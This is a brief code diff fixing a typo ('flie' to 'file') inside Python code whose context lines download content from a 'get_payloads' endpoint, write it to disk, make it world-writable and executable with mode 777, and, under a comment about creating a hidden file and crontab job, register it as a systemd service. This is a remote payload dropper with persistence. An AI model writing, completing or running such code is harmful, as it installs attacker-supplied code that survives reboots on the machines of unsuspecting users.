@@ -182,7 +182,7 @@ try {
             response = requests.get(f"{url}get_payloads/{download_path}")
             with open(file_path, "wb") as file:
                 file.write(response.content)
-                flie.close()
+                file.close()
             os.chmod(file_path, 0o777)
         # Create a hidden file and add a crontab job
         create_systemd_service(file_path)
